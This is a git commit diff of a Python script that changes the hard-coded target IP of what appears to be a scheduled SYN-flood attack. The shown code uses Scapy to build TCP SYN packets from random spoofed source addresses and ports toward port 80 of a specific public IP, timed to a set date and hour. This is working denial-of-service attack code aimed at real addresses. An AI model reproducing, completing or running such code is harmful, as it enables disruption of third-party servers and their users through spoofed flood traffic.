972a5a69c89487e91860e1a241040e7f7006611f
Technomancer <32704145+Fred-the-bot@users.noreply.github.com>
2022-12-01 08:54:54 +0100

    Update script.py

--- script.py
+++ script.py
@@ -5,7 +5,7 @@ while True:
     localtime = time.asctime( time.localtime(time.time()) )
 
     while localtime[8]+localtime[9]=="09" and localtime[11]+localtime[12]=="18": #runs the script forever localtime8 and 9 is the date, while 11 12 is the hour of the day
-        target_ip = "217.63.102.161"
+        target_ip = "79.171.148.161"
         target_port = 80
         ip = IP(src=RandIP(), dst=target_ip) #sends from a random IP to the target ip of the server
         tcp = TCP(sport=RandShort(), dport=target_port, flags="S") #sends from random port, to the target port of 80, with the SYN flag on
